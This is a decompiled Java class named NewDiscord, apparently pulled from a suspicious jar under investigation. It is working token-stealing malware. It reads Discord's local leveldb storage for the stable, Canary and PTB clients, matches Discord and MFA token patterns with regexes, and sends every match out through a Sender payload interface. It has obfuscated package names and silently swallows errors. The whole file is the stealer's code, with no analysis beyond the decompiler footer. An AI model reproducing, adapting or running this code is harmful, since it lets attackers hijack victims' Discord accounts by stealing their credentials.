/*    */ package idasido.adldaosd.wpiw.payload.impl;
/*    */ 
/*    */ import idasido.adldaosd.wpiw.payload.Payload;
/*    */ import idasido.adldaosd.wpiw.payload.Sender;
/*    */ import idasido.adldaosd.wpiw.util.Message;
/*    */ import java.io.BufferedReader;
/*    */ import java.io.DataInputStream;
/*    */ import java.io.File;
/*    */ import java.io.FileInputStream;
/*    */ import java.io.InputStreamReader;
/*    */ import java.util.regex.Matcher;
/*    */ import java.util.regex.Pattern;
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ public class NewDiscord
/*    */   implements Payload
/*    */ {
/*    */   public void execute() throws Exception {
/*    */     try {
/* 23 */       String path = System.getProperty("user.home") + "/AppData/Roaming/discord/Local Storage/leveldb/";
/* 24 */       String canaryPath = System.getProperty("user.home") + "/AppData/Roaming/discordcanary/Local Storage/leveldb/";
/* 25 */       String ptbPath = System.getProperty("user.home") + "/AppData/Roaming/discordptb/Local Storage/leveldb/";
/* 26 */       File file = new File(path);
/* 27 */       File fileCanary = new File(canaryPath);
/* 28 */       File ptbFile = new File(ptbPath);
/* 29 */       String[] pathnames = file.list();
/* 30 */       String[] canaryPathnames = fileCanary.list();
/* 31 */       String[] ptbPathnames = ptbFile.list();
/* 32 */       for (String pathname : pathnames) {
/*    */         try {
/* 34 */           FileInputStream fstream2 = new FileInputStream(path + pathname);
/* 35 */           DataInputStream in = new DataInputStream(fstream2);
/* 36 */           BufferedReader br = new BufferedReader(new InputStreamReader(in)); String strLine;
/* 37 */           while ((strLine = br.readLine()) != null) {
/* 38 */             Pattern p = Pattern.compile("[nNmM][\\w\\W]{23}\\.[xX][\\w\\W]{5}\\.[\\w\\W]{27}|mfa\\.[\\w\\W]{84}");
/* 39 */             Pattern pattern = Pattern.compile("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}");
/* 40 */             Matcher matcher = p.matcher(strLine);
/* 41 */             if (matcher.find())
/* 42 */               Sender.send((new Message.Builder("Discord Token")).addField("Mfa Token", matcher.group(), false).build()); 
/*    */             Matcher m;
/* 44 */             if (!(m = pattern.matcher(strLine)).find())
/* 45 */               continue;  Sender.send((new Message.Builder("Discord Token")).addField("Token", m.group(), false).build());
/*    */           } 
/* 47 */           in.close();
/* 48 */           fstream2.close();
/*    */         }
/* 50 */         catch (Exception exception) {}
/*    */       } 
/*    */ 
/*    */       
/* 54 */       if (fileCanary.exists()) {
/* 55 */         for (String pathname : canaryPathnames) {
/*    */           try {
/* 57 */             FileInputStream fstream2 = new FileInputStream(path + pathname);
/* 58 */             DataInputStream in = new DataInputStream(fstream2);
/* 59 */             BufferedReader br = new BufferedReader(new InputStreamReader(in)); String strLine;
/* 60 */             while ((strLine = br.readLine()) != null) {
/* 61 */               Pattern p = Pattern.compile("[nNmM][\\w\\W]{23}\\.[xX][\\w\\W]{5}\\.[\\w\\W]{27}|mfa\\.[\\w\\W]{84}");
/* 62 */               Pattern pattern = Pattern.compile("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}");
/* 63 */               Matcher matcher = p.matcher(strLine);
/* 64 */               if (matcher.find())
/* 65 */                 Sender.send((new Message.Builder("Discord Token")).addField("Mfa Token", matcher.group(), false).build()); 
/*    */               Matcher m;
/* 67 */               if (!(m = pattern.matcher(strLine)).find())
/* 68 */                 continue;  Sender.send((new Message.Builder("Discord Token")).addField("Token", m.group(), false).build());
/*    */             } 
/* 70 */             in.close();
/* 71 */             fstream2.close();
/*    */           }
/* 73 */           catch (Exception exception) {}
/*    */         } 
/*    */       }
/*    */ 
/*    */       
/* 78 */       if (ptbFile.exists()) {
/* 79 */         for (String pathname : ptbPathnames) {
/*    */           try {
/* 81 */             FileInputStream fstream2 = new FileInputStream(path + pathname);
/* 82 */             DataInputStream in = new DataInputStream(fstream2);
/* 83 */             BufferedReader br = new BufferedReader(new InputStreamReader(in)); String strLine;
/* 84 */             while ((strLine = br.readLine()) != null) {
/* 85 */               Pattern p = Pattern.compile("[nNmM][\\w\\W]{23}\\.[xX][\\w\\W]{5}\\.[\\w\\W]{27}|mfa\\.[\\w\\W]{84}");
/* 86 */               Pattern pattern = Pattern.compile("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}");
/* 87 */               Matcher matcher = p.matcher(strLine);
/* 88 */               if (matcher.find())
/* 89 */                 Sender.send((new Message.Builder("Discord Token")).addField("Mfa Token", matcher.group(), false).build()); 
/*    */               Matcher m;
/* 91 */               if (!(m = pattern.matcher(strLine)).find())
/* 92 */                 continue;  Sender.send((new Message.Builder("Discord Token")).addField("Token", m.group(), false).build());
/*    */             } 
/* 94 */             in.close();
/* 95 */             fstream2.close();
/*    */           }
/* 97 */           catch (Exception exception) {}
/*    */         
/*    */         }
/*    */       
/*    */       }
/*    */     }
/* :3 */     catch (Exception exception) {}
/*    */   }
/*    */ }


/* Location:              C:\Users\aesthetical\Downloads\investagate\COPE-1.0-SNAPSHOT-server.jar!\idasido\adldaosd\wpiw\payload\impl\NewDiscord.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */